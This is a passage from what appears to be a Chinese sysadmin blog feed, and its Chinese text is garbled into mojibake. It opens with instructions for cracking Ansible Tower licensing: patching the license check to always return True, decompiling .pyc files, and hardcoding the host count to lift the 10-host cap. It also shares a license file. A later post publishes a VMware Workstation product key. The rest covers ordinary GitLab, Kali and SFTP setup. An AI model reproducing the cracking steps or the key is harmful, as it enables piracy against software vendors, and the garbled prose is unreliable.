´è§£æ–¹å¼æ›´æ”¹ï¼Œæ— éœ€ç”³è¯·licenseæ–‡ä»¶ </strong></p></div><p>æ›´æ”¹æ–‡ä»¶<code>/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.py</code>ç¬¬120è¡Œå¦‚ä¸‹</p><figure class="highlight python"><div class="figcode"><div class="code"><pre><div class="line"><span class="number">119</span>     <span class="function"><span class="keyword">def</span> <span class="title">_check_cloudforms_subscription</span><span class="params">(self)</span>:</span></div><div class="line diff-addition"><span class="number">120</span>         <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"><span class="number">121</span>         <span class="keyword">if</span> os.path.isdir(<span class="string">"/opt/rh/cfme-appliance"</span>) <span class="keyword">and</span> os.path.isdir(<span class="string">"/opt/rh/cfme-gemset"</span>):</div><div class="line"><span class="number">122</span>             <span class="keyword">try</span>:</div><div class="line"><span class="number">123</span>                 has_rpms = subprocess.call([<span class="string">"rpm"</span>, <span class="string">"--quiet"</span>, <span class="string">"-q"</span>, <span class="string">"cfme"</span>, <span class="string">"cfme-appliance"</span>, <span class="string">"cfme-gemset"</span>])</div><div class="line"><span class="number">124</span>                 <span class="keyword">if</span> has_rpms == <span class="number">0</span>:</div><div class="line"><span class="number">125</span>                     <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"><span class="number">126</span>             <span class="keyword">except</span> OSError:</div><div class="line"><span class="number">127</span>                 <span class="keyword">pass</span></div><div class="line"><span class="number">128</span>         <span class="keyword">return</span> <span class="keyword">False</span></div></pre></div></div></figure><p>HOSTSé™åˆ¶ç ´è§£</p><p>åæ±‡ç¼–<code>/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">cd /var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/; uncompyle6 __init__.pyc &gt;__init__.py</div><div class="line">rm -f __init__.pyc __init__.pyo</div></pre></div></div></figure><p>æ›´æ”¹æ–‡ä»¶ <code>/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc</code></p><figure class="highlight python"><figcaption><span class="caption">æ›´æ”¹ä½153è¡Œå¦‚ä¸‹</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#available_instances = int(attrs.get('instance_count', None) or 0)</span></div><div class="line">available_instances = <span class="number">100000</span></div><div class="line">attrs[<span class="string">'current_instances'</span>] = current_instances</div></pre></div></div></figure><p>è®¿é—®towerï¼š<code>https://192.168.99.188/</code>ï¼Œé»˜è®¤ç”¨æˆ·åä¸º<code>admin</code>å¯†ç ä¸º<code>inventory</code>æ–‡ä»¶ä¸­è®¾ç½®çš„<code>admin_password=&#39;admin&#39;</code></p><p><img src="https://kionf.com/article_images/tower/tower-login.png" alt="kionf"></p><p>é‡ç‚¹æ¥äº†ï¼Œè¿™é‡Œä¼šæç¤ºè®©é€‰æ‹©licenseæ–‡ä»¶ï¼Œç”³è¯·è¿™ä¸ªå¾ˆæ˜¯éº»çƒ¦ï¼Œsoè¿™é‡Œåˆ†äº«ä¸‹æˆ‘è‡ªå·±ç”³è¯·ä¸‹æ¥çš„<a href="https://kionf.com/uploads/license_4ecef0cbe6d542e48d938b8827df5590.txt" title="licenseæ–‡ä»¶">licenseæ–‡ä»¶</a>ç›´æ¥å¯¼å…¥å°±okã€‚<strong>ä»…ä¾›å®éªŒæµ‹è¯•ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºå…¶å®ƒç”¨é€”ï¼</strong>ã€‚</p><p><img src="https://kionf.com/article_images/tower/tower-license.png" alt="kionf"></p><h1 id="0x03-ç ´è§£10ä¸ªhostsé™åˆ¶"><a href="#0x03-ç ´è§£10ä¸ªhostsé™åˆ¶" class="headerlink" title="0x03 ç ´è§£10ä¸ªhostsé™åˆ¶"></a>0x03 ç ´è§£10ä¸ªhostsé™åˆ¶</h1><p>ç”³è¯·çš„å…è´¹ç‰ˆlicenseæœ€å¤šåªèƒ½æ·»åŠ 10ä¸ªä¸»æœºã€‚</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">HOSTS AVAILABLE    10</div></pre></div></div></figure><p>é¦–å…ˆä¸‹è½½pythonåç¼–è¯‘å·¥å…·</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">pip install uncompyle2</div></pre></div></div></figure><p>åç¼–è¯‘æ–‡ä»¶task_engine.pyc</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#æŸ¥æ‰¾æ–‡ä»¶</span></div><div class="line">root@2813e2635181:~<span class="comment"># find / -name task_engine.pyc</span></div><div class="line"></div><div class="line">/usr/lib/python2.7/dist-packages/awx/main/task_engine.pyc</div><div class="line"></div><div class="line"><span class="built_in">cd</span> /usr/lib/python2.7/dist-packages/awx/main/</div><div class="line"></div><div class="line"><span class="comment">#åç¼–è¯‘æ–‡ä»¶</span></div><div class="line">uncompyle6 task_engine.pyc &gt;task_engine.py</div></pre></div></div></figure><p>æ›´æ”¹<code>task_engine.pyc</code>æ–‡ä»¶</p><p>ä¿®æ”¹å†…å®¹ <code>available_instances = int(self.attributes[&#39;instance_count&#39;])</code>ä¸º<code>available_instances = 10000</code>ï¼Œå¤§çº¦åœ¨162è¡Œ</p><p>åˆ é™¤<code>task_engine.pyc task_engine.pyo</code>ï¼Œé‡å¯tower</p><p><img src="https://kionf.com/article_images/tower/tower-fuck.png" alt="kionf"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>è‡³æ­¤å®‰è£…ç ´è§£éƒ½å·²å®Œæˆã€‚ç®€å•çš„è¯•ç”¨äº†ä¸‹ï¼Œå¾ˆæ–¹ä¾¿ï¼Œé€šè¿‡gitæ¥è·å–æ›´æ–°ä»»åŠ¡playbookæ–‡ä»¶ï¼Œå›¾å½¢åŒ–é…ç½®playbookå‚æ•°ï¼Œä»»åŠ¡å®¡è®¡è®°å½•ã€‚ç»“åˆansibleè¿›è¡Œä¸»æœºç®¡ç†ï¼ŒæœåŠ¡éƒ¨ç½²ï¼Œå¾ˆæ–¹ä¾¿ã€‚<br>å†™äº†ä¸ªzookeeperé›†ç¾¤éƒ¨ç½²çš„playbook <strong><a href="https://github.com/kalivim/ansible-playbook" title="kionf" target="_blank" rel="noopener">deploy_zk</a></strong>ã€‚:P</p><div class="note info"><p><a href="https://kionf.com/2017/07/24/tower-useage/">Towerè¿›é˜¶</a></p></div>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> Ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ansible </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kali Linux 2017.1 å®‰è£…vmware æŠ¥é”™</title>
      <link href="/2017/07/07/kali-vmware/"/>
      <url>/2017/07/07/kali-vmware/</url>
      <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/kalivim/kalivim.github.io/master/article_images/vmware.png" alt="kionf"></p><a id="more"></a><h1 id="0x00-é˜³å…‰æ™®ç…§"><a href="#0x00-é˜³å…‰æ™®ç…§" class="headerlink" title="0x00 é˜³å…‰æ™®ç…§"></a>0x00 é˜³å…‰æ™®ç…§</h1><blockquote class="blockquote-center"><p>å®˜ç½‘ä¸‹è½½åœ°å€ï¼š<a href="https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-12.5.7-5813279.x86_64.bundle" title="VMware-Workstation" target="_blank" rel="noopener">VMware-Workstation for linux</a></p><p>Keyï¼š<code>VF5XA-FNDDJ-085GZ-4NXZ9-N20E6</code></p></blockquote><h1 id="0x01-é—®é¢˜"><a href="#0x01-é—®é¢˜" class="headerlink" title="0x01 é—®é¢˜"></a>0x01 é—®é¢˜</h1><p>å®‰è£…äº†Kali Linux 2017.1ï¼Œ ç†Ÿæ‚‰çš„è€å¸æœºå§¿åŠ¿å®‰è£…Vmware</p><p>å®‰è£…å†…æ ¸å¤´æ–‡ä»¶</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">apt-get update &amp;&amp; apt-get dist-upgrade</div><div class="line"></div><div class="line">apt-get install linux-headers-$(uname -r)</div></pre></div></div></figure><p>ç„¶åç«Ÿç„¶ç¿»è½¦äº†</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">root@***REMOVED***:~<span class="comment"># apt-get install linux-headers-$(uname -r)</span></div><div class="line"></div><div class="line">Reading package lists... Done</div><div class="line">Building dependency tree       </div><div class="line">Reading state information... Done</div><div class="line">E: Unable to locate package linux-headers-4.9.0-kali3-amd64</div><div class="line">E: Couldn<span class="string">'t find any package by glob '</span>linux-headers-4.9.0-kali3-amd64<span class="string">'</span></div><div class="line"><span class="string">E: Couldn'</span>t find any package by regex <span class="string">'linux-headers-4.9.0-kali3-amd64'</span></div></pre></div></div></figure><p>æœç´¢å†…æ ¸å¤´å®‰è£…åŒ…<code>apt search linux-headers</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">linux-headers-4.9.0-kali4-all-amd64/kali-rolling 4.9.30-2kali1 amd64</div><div class="line">  All header files <span class="keyword">for</span> Linux 4.9 (meta-package)</div></pre></div></div></figure><p>åªæœ‰kali4æ²¡kali3</p><h1 id="0x02-è§£å†³"><a href="#0x02-è§£å†³" class="headerlink" title="0x02 è§£å†³"></a>0x02 è§£å†³</h1><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">apt-get install linux-headers-amd64</div><div class="line"></div><div class="line"><span class="comment">#æ‰§è¡Œåé‡å¯æœºå™¨</span></div><div class="line"></div><div class="line">reboot</div><div class="line"></div><div class="line">root@***REMOVED***:~<span class="comment"># uname -r</span></div><div class="line"></div><div class="line"><span class="comment"># 4.9.0-kali4-amd64</span></div><div class="line"></div><div class="line">apt-get install linux-headers-$(uname -r)</div></pre></div></div></figure><p>OK è§£å†³</p>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GitLab 9.2.6 å®‰è£…åŠæ±‰åŒ–</title>
      <link href="/2017/06/21/linux-gitlab/"/>
      <url>/2017/06/21/linux-gitlab/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/gitlab-zh.png" alt="kionf"></p><blockquote class="blockquote-center"><p>GitLab å®˜æ–¹æ–°ç‰ˆ(9.2.6)å®‰è£…åŠæ±‰åŒ–</p></blockquote><a id="more"></a><h1 id="0x00-å®‰è£…GitLab"><a href="#0x00-å®‰è£…GitLab" class="headerlink" title="0x00 å®‰è£…GitLab"></a>0x00 å®‰è£…GitLab</h1><div class="note info"><p>æµ‹è¯•ä¸»æœº: CentOS Linux release 7.3.1611 (Core)<br>å…¶å®ƒç³»ç»Ÿå‚è€ƒ: <a href="https://about.gitlab.com/installation/" title="å®˜æ–¹æ•™ç¨‹" target="_blank" rel="noopener">GitLabå®‰è£…</a></p></div><h2 id="å®‰è£…å’Œé…ç½®å¿…è¦çš„ä¾èµ–å…³ç³»"><a href="#å®‰è£…å’Œé…ç½®å¿…è¦çš„ä¾èµ–å…³ç³»" class="headerlink" title="å®‰è£…å’Œé…ç½®å¿…è¦çš„ä¾èµ–å…³ç³»"></a>å®‰è£…å’Œé…ç½®å¿…è¦çš„ä¾èµ–å…³ç³»</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">sudo yum install curl policycoreutils openssh-server openssh-clients</div><div class="line">sudo systemctl <span class="built_in">enable</span> sshd</div><div class="line">sudo systemctl start sshd</div><div class="line">sudo yum install postfix</div><div class="line">sudo systemctl <span class="built_in">enable</span> postfix</div><div class="line">sudo systemctl start postfix</div><div class="line"></div><div class="line">sudo firewall-cmd --permanent --add-service=http</div><div class="line">sudo systemctl reload firewalld</div></pre></div></div></figure><h2 id="æ·»åŠ GitLabæœåŠ¡åŒ…å¹¶å®‰è£…"><a href="#æ·»åŠ GitLabæœåŠ¡åŒ…å¹¶å®‰è£…" class="headerlink" title="æ·»åŠ GitLabæœåŠ¡åŒ…å¹¶å®‰è£…"></a>æ·»åŠ GitLabæœåŠ¡åŒ…å¹¶å®‰è£…</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash</div><div class="line">sudo yum install gitlab-ce</div></pre></div></div></figure><h2 id="é…ç½®å¹¶å¯åŠ¨GitLab"><a href="#é…ç½®å¹¶å¯åŠ¨GitLab" class="headerlink" title="é…ç½®å¹¶å¯åŠ¨GitLab"></a>é…ç½®å¹¶å¯åŠ¨GitLab</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">vim +13 /etc/gitlab/gitlab.rb</div><div class="line"><span class="comment"># ä¿®æ”¹external_url 'http://172.16.0.123'ä¸ºå†…ç½‘ipæˆ–ç»‘å®šçš„åŸŸå</span></div><div class="line"><span class="comment"># æ­¤å¤„çš„åœ°å€ç”Ÿæ•ˆåœ¨é¡¹ç›®urlåœ°å€å¤„</span></div><div class="line"></div><div class="line">sudo gitlab-ctl reconfigure</div><div class="line"><span class="comment"># å¯åŠ¨æœåŠ¡</span></div></pre></div></div></figure><h2 id="æŸ¥çœ‹"><a href="#æŸ¥çœ‹" class="headerlink" title="æŸ¥çœ‹"></a>æŸ¥çœ‹</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </div><div class="line">tcp        0      0 127.0.0.1:9100          0.0.0.0:*               LISTEN      25658/node_exporter </div><div class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      25718/unicorn maste </div><div class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      25650/nginx: master </div><div class="line">tcp        0      0 127.0.0.1:9168          0.0.0.0:*               LISTEN      25631/ruby                 </div><div class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1439/master         </div><div class="line">tcp        0      0 0.0.0.0:8060            0.0.0.0:*               LISTEN      25650/nginx: master </div><div class="line">tcp        0      0 127.0.0.1:9121          0.0.0.0:*               LISTEN      25692/redis_exporte </div><div class="line">tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      25678/prometheus    </div><div class="line">tcp        0      0 127.0.0.1:9187          0.0.0.0:*               LISTEN      25664/postgres_expo        </div><div class="line">tcp6       0      0 ::1:9168                :::*                    LISTEN      25631/ruby          </div><div class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      1439/master</div></pre></div></div></figure><blockquote><p>è®¿é—® <a href="http://172.16.0.123" target="_blank" rel="noopener">http://172.16.0.123</a> åˆå§‹åŒ–å¯†ç  é»˜è®¤ç”¨æˆ·åä¸º root</p></blockquote><h1 id="0x01-æ±‰åŒ–"><a href="#0x01-æ±‰åŒ–" class="headerlink" title="0x01 æ±‰åŒ–"></a>0x01 æ±‰åŒ–</h1><h2 id="æŸ¥çœ‹å½“å‰GitLabç‰ˆæœ¬"><a href="#æŸ¥çœ‹å½“å‰GitLabç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹å½“å‰GitLabç‰ˆæœ¬"></a>æŸ¥çœ‹å½“å‰GitLabç‰ˆæœ¬</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION</div><div class="line"><span class="comment"># 9.2.6</span></div></pre></div></div></figure><h2 id="cloneæ±‰åŒ–ä»£ç "><a href="#cloneæ±‰åŒ–ä»£ç " class="headerlink" title="cloneæ±‰åŒ–ä»£ç "></a>cloneæ±‰åŒ–ä»£ç </h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">mkdir -p /opt/gitlab-zh </div><div class="line"></div><div class="line"><span class="built_in">cd</span> /opt/gitlab-zh</div><div class="line"></div><div class="line">yum -y install git</div><div class="line"></div><div class="line">git <span class="built_in">clone</span> https://gitlab.com/xhang/gitlab.git</div></pre></div></div></figure><h2 id="æ¯”è¾ƒæ±‰åŒ–åˆ†æ”¯å’ŒåŸåˆ†æ”¯å¯¼å‡ºæ–‡ä»¶"><a href="#æ¯”è¾ƒæ±‰åŒ–åˆ†æ”¯å’ŒåŸåˆ†æ”¯å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="æ¯”è¾ƒæ±‰åŒ–åˆ†æ”¯å’ŒåŸåˆ†æ”¯å¯¼å‡ºæ–‡ä»¶"></a>æ¯”è¾ƒæ±‰åŒ–åˆ†æ”¯å’ŒåŸåˆ†æ”¯å¯¼å‡ºæ–‡ä»¶</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">cd gitlab</div><div class="line"></div><div class="line">git diff origin/9-2-stable 9-2-stable-zh &gt; /opt/gitlab-zh/9.2.diff</div><div class="line"></div><div class="line"># æ­¤å¤„æ˜¯9.2.6ç‰ˆæœ¬ å…¶ä»–ç‰ˆæœ¬åªéœ€æ›´æ”¹æ•°å­— ä¾‹å¦‚ä¸º9.1 : </div><div class="line"># git diff origin/9-1-stable 9-1-stable-zh &gt; /opt/gitlab-zh/9.1.diff</div></pre></div></div></figure><h2 id="æ‰“è¡¥ä¸-9-2-diff"><a href="#æ‰“è¡¥ä¸-9-2-diff" class="headerlink" title="æ‰“è¡¥ä¸(9.2.diff)"></a>æ‰“è¡¥ä¸(9.2.diff)</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">cd /opt/gitlab-zh</div><div class="line"></div><div class="line">yum -y install patch</div><div class="line"></div><div class="line">gitlab-ctl stop</div><div class="line">#åœæ­¢gitlab</div><div class="line"></div><div class="line">patch -d /opt/gitlab/embedded/service/gitlab-rails -p1 &lt; /opt/gitlab-zh/9.2.diff</div><div class="line"></div><div class="line">gotlab-ctl start</div><div class="line">#å¯åŠ¨gitlab</div></pre></div></div></figure><h1 id="0x02-ç®¡ç†è¿ç»´"><a href="#0x02-ç®¡ç†è¿ç»´" class="headerlink" title="0x02 ç®¡ç†è¿ç»´"></a>0x02 ç®¡ç†è¿ç»´</h1><h2 id="ç®¡ç†"><a href="#ç®¡ç†" class="headerlink" title="ç®¡ç†"></a>ç®¡ç†</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># å¯åŠ¨æ‰€æœ‰ gitlab ç»„ä»¶ï¼š</span></div><div class="line">sudo gitlab-ctl start</div><div class="line"></div><div class="line"><span class="comment"># åœæ­¢æ‰€æœ‰ gitlab ç»„ä»¶ï¼š</span></div><div class="line">sudo gitlab-ctl stop</div><div class="line"></div><div class="line"><span class="comment"># é‡å¯æ‰€æœ‰ gitlab ç»„ä»¶ï¼š</span></div><div class="line">sudo gitlab-ctl restart</div><div class="line"></div><div class="line"><span class="comment"># æ›´æ–°é…ç½®å¹¶é‡å¯</span></div><div class="line">sudo gitlab-ctl reconfigure</div></pre></div></div></figure><h2 id="å¤‡ä»½æ¢å¤"><a href="#å¤‡ä»½æ¢å¤" class="headerlink" title="å¤‡ä»½æ¢å¤"></a>å¤‡ä»½æ¢å¤</h2><p>å¤‡ä»½ <code>crontab</code> ä¸­æ·»åŠ </p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">0 1 * * * /usr/bin/gitlab-rake gitlab:backup:create</div></pre></div></div></figure><p>æ¢å¤</p><blockquote><p>é¦–å…ˆè¿›å…¥å¤‡ä»½ gitlab çš„ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„<code>gitlab_rails[&#39;backup_path&#39;]</code>ï¼Œé»˜è®¤ä¸º<code>/var/opt/gitlab/backups</code>ã€‚</p></blockquote><blockquote><p>ç„¶ååœæ­¢ unicorn å’Œ sidekiq ï¼Œä¿è¯æ•°æ®åº“æ²¡æœ‰æ–°çš„è¿æ¥ï¼Œä¸ä¼šæœ‰å†™æ•°æ®æƒ…å†µã€‚</p></blockquote><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">sudo gitlab-ctl stop unicorn</div><div class="line"><span class="comment"># ok: down: unicorn: 0s, normally up</span></div><div class="line"></div><div class="line">sudo gitlab-ctl stop sidekiq</div><div class="line"><span class="comment"># ok: down: sidekiq: 0s, normally up</span></div></pre></div></div></figure><p>ç„¶åæ¢å¤æ•°æ®ï¼Œ1498033332ä¸ºå¤‡ä»½æ–‡ä»¶çš„æ—¶é—´æˆ³</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">ls /var/opt/gitlab/backups</div><div class="line"><span class="comment">#1498033332_2017_06_21_9.2.6_gitlab_backup.tar</span></div><div class="line"></div><div class="line">gitlab-rake gitlab:backup:restore BACKUP=1498033332</div></pre></div></div></figure><h2 id="æ•°æ®å‚¨å­˜"><a href="#æ•°æ®å‚¨å­˜" class="headerlink" title="æ•°æ®å‚¨å­˜"></a>æ•°æ®å‚¨å­˜</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œgitlab å°†æ•°æ®å­˜å‚¨åœ¨<code>/var/opt/gitlab/git-data</code>ç›®å½•ä¸‹ï¼Œå—é™äºåˆ†åŒºæƒ…å†µ&amp;æ–¹ä¾¿ç®¡ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®è¿ç§»åˆ°åˆ«çš„ç›®å½•ä¸‹ã€‚</p><blockquote><p>æ²¡æœ‰æŠ•å…¥ä½¿ç”¨å¯ç›´æ¥æ›´æ”¹</p></blockquote><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">vim /etc/gitlab/gitlab.rb</div><div class="line"></div><div class="line"><span class="comment">#æ·»åŠ </span></div><div class="line">git_data_dir <span class="string">"/path/to/git-data"</span></div><div class="line"></div><div class="line"><span class="comment"># æ›´æ–°é…ç½®å¹¶é‡å¯</span></div><div class="line">sudo gitlab-ctl reconfigure</div></pre></div></div></figure><h2 id="æ•°æ®è¿ç§»"><a href="#æ•°æ®è¿ç§»" class="headerlink" title="æ•°æ®è¿ç§»"></a>æ•°æ®è¿ç§»</h2><p>é¦–å…ˆéœ€è¦æš‚åœæœåŠ¡ï¼Œé¿å…ç”¨æˆ·åœ¨è¿ç§»æœŸé—´è¯»å†™æ•°æ®ï¼š</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">gitlab-ctl stop</div><div class="line"></div><div class="line">rsync -av /var/opt/gitlab/git-data/repositories /path/to/git-data/</div><div class="line"></div><div class="line">sudo gitlab-ctl start</div><div class="line"></div><div class="line">sudo gitlab-ctl reconfigure</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> GitLab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitLab </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¦ç”¨ç”¨æˆ·SSHç™»é™†ï¼ŒSFTPé”å®šæŒ‡å®šç›®å½•é…ç½®è¯¦è§£</title>
      <link href="/2017/05/17/linux-sftp/"/>
      <url>/2017/05/17/linux-sftp/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>SFTPï¼Œå³ SSH æ–‡ä»¶ä¼ è¾“åè®®ï¼Œæˆ–è€…è¯´æ˜¯å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®, é€šè¿‡SSHç«¯å£åŠ å¯†ä¼ è¾“ã€‚ä½†æ˜¯ï¼Œç”±äºè¿™ç§ä¼ è¾“æ–¹å¼ä½¿ç”¨äº†åŠ å¯†/è§£å¯†æŠ€æœ¯ï¼Œæ‰€ä»¥ä¼ è¾“æ•ˆç‡æ¯”æ™®é€šçš„FTPè¦ä½å¾—å¤šã€‚SFTPçš„ä¼˜åŠ¿åœ¨äºSSHè½¯ä»¶åŒ…ä¸­åŒ…å«SFTPï¼ˆæ— éœ€é¢å¤–å®‰è£…ï¼‰ï¼Œiptablesæ— éœ€æ·»åŠ é¢å¤–ç«¯å£ï¼Œé…ç½®æ–¹ä¾¿</p></blockquote><a id="more"></a><h1 id="0x00-æ·»åŠ ç”¨æˆ·"><a href="#0x00-æ·»åŠ ç”¨æˆ·" class="headerlink" title="0x00 æ·»åŠ ç”¨æˆ·"></a>0x00 æ·»åŠ ç”¨æˆ·</h1><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ SFTP ä½¿ç”¨ SSH åè®®è¿›è¡Œèº«ä»½éªŒè¯å¹¶å»ºç«‹å®‰å…¨è¿æ¥,æ‰€ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤æ·»åŠ è´¦æˆ·ã€‚</p><h2 id="æ·»åŠ ç»„"><a href="#æ·»åŠ ç»„" class="headerlink" title="æ·»åŠ ç»„"></a>æ·»åŠ ç»„</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">groupadd sftp</div></pre></div></div></figure><h2 id="å†æ·»åŠ è´¦æˆ·"><a href="#å†æ·»åŠ è´¦æˆ·" class="headerlink" title="å†æ·»åŠ è´¦æˆ·"></a>å†æ·»åŠ è´¦æˆ·</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">useradd -g sftp -M -N -s /sbin/nologin user</div><div class="line"></div><div class="line"><span class="comment">#æ·»åŠ usernameç”¨æˆ·å¹¶ä¸”ç¦æ­¢æ­¤ç”¨æˆ·loginç³»ç»Ÿ</span></div></pre></div></div></figure><h2 id="æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦æ·»åŠ åˆ°ç»„"><a href="#æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦æ·»åŠ åˆ°ç»„" class="headerlink" title="æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦æ·»åŠ åˆ°ç»„"></a>æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦æ·»åŠ åˆ°ç»„</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">[root@Centos6-8-TestEnv data]<span class="comment">#  groups user</span></div><div class="line"></div><div class="line">user : sftp</div></pre></div></div></figure><h2 id="è®¾ç½®å¯†ç "><a href="#è®¾ç½®å¯†ç " class="headerlink" title="è®¾ç½®å¯†ç "></a>è®¾ç½®å¯†ç </h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@Centos6-8-TestEnv data]<span class="comment"># passwd user</span></div><div class="line">æ›´æ”¹ç”¨æˆ· user 